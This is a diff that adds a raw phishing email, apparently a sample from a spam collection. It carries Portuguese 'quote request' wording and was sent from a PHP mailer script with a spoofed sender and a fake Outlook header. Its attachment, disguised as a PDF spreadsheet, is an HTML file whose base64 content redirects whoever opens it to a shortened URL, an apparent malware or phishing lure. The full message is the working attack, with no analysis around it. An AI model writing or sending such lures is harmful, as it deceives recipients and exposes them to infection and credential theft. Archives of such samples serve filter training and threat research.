@@ -1,0 +1,44 @@
+Return-path: <www-data@li222-47.members.linode.com>
+Envelope-to: hq@worldfinancesearchengines.com
+Delivery-date: Wed, 15 Oct 2014 22:40:07 -0600
+Received: from [173.255.212.47] (port=42700 helo=li222-47.members.linode.com)
+	by rsj14.rhostjh.com with esmtp (Exim 4.82)
+	(envelope-from <www-data@li222-47.members.linode.com>)
+	id 1Xecr9-0002OJ-4E
+	for hq@worldfinancesearchengines.com; Wed, 15 Oct 2014 22:40:07 -0600
+Received: by li222-47.members.linode.com (Postfix, from userid 33)
+	id 7B9DFB500; Thu, 16 Oct 2014 04:40:03 +0000 (UTC)
+To: hq@worldfinancesearchengines.com
+Subject: Orcamento - 3418095
+X-PHP-Originating-Script: 0:xman.php
+X-Mailer: Microsoft Office Outlook, Build 17.551210
+From: Anexo <email@provedor.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="7e5c0048eb424a99a3d3fa5d8d12cc8c"
+Message-Id: <20141016044003.7B9DFB500@li222-47.members.linode.com>
+Date: Thu, 16 Oct 2014 04:40:03 +0000 (UTC)
+X-Identified-User: {0000:rsj14.rhostjh.com:local:local} {sentby:Delivered locally}
+
+Content-Transfer-Encoding: 7bit
+This is a MIME encoded message.
+
+--7e5c0048eb424a99a3d3fa5d8d12cc8c
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: 8bit
+
+Segue em Anexo o Orcamento Solicitado!
+
+<br><a scr="id:0,992423176765442">
+
+--7e5c0048eb424a99a3d3fa5d8d12cc8c
+Content-Type: application/octet-stream; name="Planilha_de_Orcamentos-PDF.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+
+PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDsgdXJsPWh0dHA6Ly9iaXQubHkv
+MXNVeFVwciI+
+
+
+--7e5c0048eb424a99a3d3fa5d8d12cc8c--
+
+
